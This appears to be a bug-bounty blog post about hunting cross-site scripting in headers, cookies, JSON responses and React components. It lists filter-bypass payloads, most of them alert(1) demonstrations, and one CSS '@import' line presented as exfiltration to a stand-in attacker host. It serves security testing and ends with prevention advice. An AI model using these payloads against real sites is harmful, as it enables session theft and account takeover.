I was testing a web application late one night when I triggered a humble **alert(1)** box. It blinked on my screen, almost mockingly ‚Äî something every hacker sees countless times. But this wasn‚Äôt just another popup. This one cracked the application wide open.

### üß† What Is XSS, Really?

Cross-Site Scripting (XSS) is more than a basic vulnerability. It's a **fundamental failure in how a web app handles user input** ‚Äî and it‚Äôs still everywhere in 2025.

How does it work?

XSS allows attackers to inject JavaScript into a website viewed by others. When executed in the victim‚Äôs browser, it can:

* Steal cookies, session tokens, or credentials
* Perform actions on behalf of users
* Redirect to malicious pages or phishing kits
* Bypass security controls with crafted payloads

### üß¨ The Types You Know (and One You May Not)

Most guides list the usual suspects:

1. **Stored XSS**‚Ää‚Äî‚ÄäPayload gets stored (like in a comment) and executes when viewed.

**2. Reflected XSS**‚Ää‚Äî‚ÄäPayload is reflected off the server immediately, often via URL.

**3. DOM-based XSS**‚Ää‚Äî‚ÄäThe client-side JavaScript is the source of the vulnerability.

But the reality is more nuanced. Modern apps blur these lines ‚Äî with Single Page Applications (SPAs), APIs, and frontend frameworks introducing new attack surfaces.

### üîç The XSS That Hides in Plain Sight

Let me share how I find XSS in places others skip ‚Äî and how you can too.

### 1. üßµ Header-Based Reflections

Everyone tests forms. Few test headers.

I once found a reflected XSS by modifying the Referer header like this:

```
Referer: <script>alert(1)</script>
```

When the app used that header value in a client-side notification, the payload executed flawlessly.

Headers to try:

* User-Agent
* Referer
* X-Forwarded-For
* X-Requested-With

**üî• Pro Tip:** *Use Burp Suite or curl to manually modify headers ‚Äî some bugs don't show up in browser-based testing.*

### 2. üç™ Cookie Injection

Many apps store themes, preferences, or user settings in cookies. And sometimes, those values are reflected back in the DOM.

![]()

Imagine setting:

```
theme=<img src=x onerror=alert(1)>
```

Then visiting a page that pulls the cookie into the frontend. Boom.

This kind of XSS is often missed by automated scanners, but you can catch it by inspecting cookie usage in DevTools.

### 3. üì¶ JSON-Based Reflections

Modern apps often reflect input through **JSON APIs**, and JavaScript renders them directly:

```
{ "msg": "Hello, <script>alert(1)</script>" }
```

If this gets parsed into the DOM without escaping, it's game over.

Look for:

```
/api/ or /search/ endpoints
```

```
msg, desc, or label fields
```

Template rendering in JavaScript

Also try:

```
{ "error": "<img src=x onerror=alert(1)>" }
```

### 4. üß© The Shadow DOM

Here's a sneaky one: some frontend libraries (especially React and Vue) inject user data into the DOM with little-to-no sanitization ‚Äî especially in dynamic components like:

```
<div dangerouslySetInnerHTML={{__html: userInput}}>
```

This isn‚Äôt just DOM XSS ‚Äî it‚Äôs a developer trap.

Use payloads like:

```
<svg/onload=alert(1)> <iframe src="javascript:alert(1)">
```

Or even CSS-based exfiltration:

```
<style>@import 'http://yourserver.com'</style>
```

### üõ†Ô∏è Tools That Actually Help

Forget brute-force lists. These tools adapt to the context of the application:

1. **Dalfox** ‚Äì *Fast and intelligent XSS scanner with context-aware fuzzing*
2. **XSStrike** ‚Äì *Advanced payload generation, filter detection, and DOM XSS detection*
3. **Burp Suite** ‚Äì *Your best friend for intercepting and testing inputs*
4. **Chrome DevTools** ‚Äì *Perfect for identifying how scripts are inserted in real time*

### üìú Real-World Payloads That Work in 2025

Here are a few payloads that bypass modern filters:

```
<img src=x onerror=alert(1)>
```

```
<svg onload=alert`1`>
```

```
<iframe src="javascript:alert(1)">
```

```
<math href="data:x,alert(1)">
```

```
<video><source onerror="alert(1)">
```

Always customize payloads based on context ‚Äî HTML, JavaScript, or URL injection.

### ‚úÖ How Developers Can Prevent It

* *Avoid innerHTML, document.write, and similar unsafe APIs*
* *Use Content Security Policy (CSP) to block inline scripts*
* *Validate input‚Ää‚Äî‚Ääbut more importantly, sanitize output.*

### Bonus Tip: XSS in Error Messages

* *Observe how your input is reflected in the error message*
* *Look for stack traces, JavaScript logs, or dynamic error responses*

> *I once found a reflected XSS inside a custom 404 page ‚Äî where my payload was shown in a debug box. That single popup netted me a critical bounty.*

### ‚úçÔ∏è Final Thoughts

*We tend to associate XSS with beginner hacking, but in reality, it rewards persistence and creativity. You can test the same site as 1,000 others ‚Äî* ***but if you look in the right places, with the right payloads, you‚Äôll find what they missed.***

> It all starts with alert(1) ‚Äî and ends with real impact.
